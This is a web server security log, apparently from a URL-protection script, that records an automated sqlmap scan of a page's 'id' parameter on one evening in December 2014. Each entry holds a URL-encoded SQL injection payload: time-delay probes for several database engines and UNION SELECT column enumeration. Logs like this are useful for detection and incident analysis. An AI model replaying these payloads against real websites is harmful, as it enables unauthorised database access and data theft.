7-12-2014 19:22:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29%20AND%20%286288%3D6288&attempt=1 | Referer: no referer

7-12-2014 19:22:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29&attempt=1 | Referer: no referer

7-12-2014 19:22:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29--%20vBBh&attempt=1 | Referer: no referer

7-12-2014 19:22:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27wiRO%27%3D%27wiRO&attempt=1 | Referer: no referer

7-12-2014 19:22:39 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29%20AND%20%27jdHS%27%3D%27jdHS&attempt=1 | Referer: no referer

7-12-2014 19:22:40 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29%20AND%20%27jdHS%27%3D%27jdHS&attempt=1 | Referer: no referer

7-12-2014 19:22:40 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%209264%3D%28SELECT%209264%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:42 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29%20AND%20%285862%3D5862&attempt=1 | Referer: no referer

7-12-2014 19:22:42 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29&attempt=1 | Referer: no referer

7-12-2014 19:22:42 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29--%20rnhM&attempt=1 | Referer: no referer

7-12-2014 19:22:42 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29%20AND%20%28%27zWte%27%3D%27zWte&attempt=1 | Referer: no referer

7-12-2014 19:22:43 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29%20AND%20%27xMWH%27%3D%27xMWH&attempt=1 | Referer: no referer

7-12-2014 19:22:43 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20AND%207209%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2898%29%7C%7CCHR%2890%29%7C%7CCHR%2875%29%2C5%29%20AND%20%27%25%27%3D%27&attempt=1 | Referer: no referer

7-12-2014 19:22:44 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:44 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:44 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:45 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:45 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:45 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:45 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:46 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:46 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:46 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:48 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:48 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:48 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:48 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:49 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:49 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:49 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:50 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:50 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:52 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:52 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:52 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:53 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:53 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:54 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:54 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:54 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:54 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:54 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:55 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:55 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:55 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:56 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:57 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:57 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:57 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:57 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:22:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:00 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:00 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:00 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:01 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:01 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:01 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:01 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:02 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:02 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:02 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&attempt=1 | Referer: no referer

7-12-2014 19:23:03 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:04 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:04 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:04 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:05 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:05 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:05 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:05 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:06 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:06 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

